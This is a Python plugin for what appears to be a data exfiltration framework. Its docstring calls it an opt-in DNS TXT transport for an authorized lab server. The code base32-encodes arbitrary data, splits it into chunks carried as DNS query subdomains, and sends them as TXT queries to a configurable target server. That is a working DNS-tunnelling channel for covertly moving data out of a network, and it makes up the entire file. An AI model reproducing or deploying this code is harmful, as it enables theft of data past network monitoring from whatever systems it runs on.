"""Opt-in DNS TXT-query transport for an authorized DNS lab server."""

import base64

app_exfiltrate = None
config = None


def send(data):
    if not config.get('enabled', False):
        raise RuntimeError('dns_txt transport is disabled in configuration')
    from dnslib import DNSRecord

    payload = data.encode('utf-8') if isinstance(data, str) else data
    encoded = base64.b32encode(payload).decode('ascii').rstrip('=').lower()
    job_id = data.split('|!|', 1)[0] if isinstance(data, str) else 'lab'
    width = int(config.get('chunk_size', 40))
    domain = config['domain'].strip('.')
    for offset in range(0, len(encoded), width):
        chunk = encoded[offset:offset + width]
        query = '{}.{}.{}'.format(job_id, chunk, domain)
        app_exfiltrate.log_message('info', '[dns_txt] Querying {}'.format(query))
        DNSRecord.question(query, qtype='TXT').send(
            config['target'], int(config.get('port', 53)), timeout=1)


class Plugin:
    def __init__(self, app, conf):
        global app_exfiltrate, config
        app_exfiltrate, config = app, conf
        if conf.get('enabled', False):
            app.register_plugin('dns_txt', {'send': send})
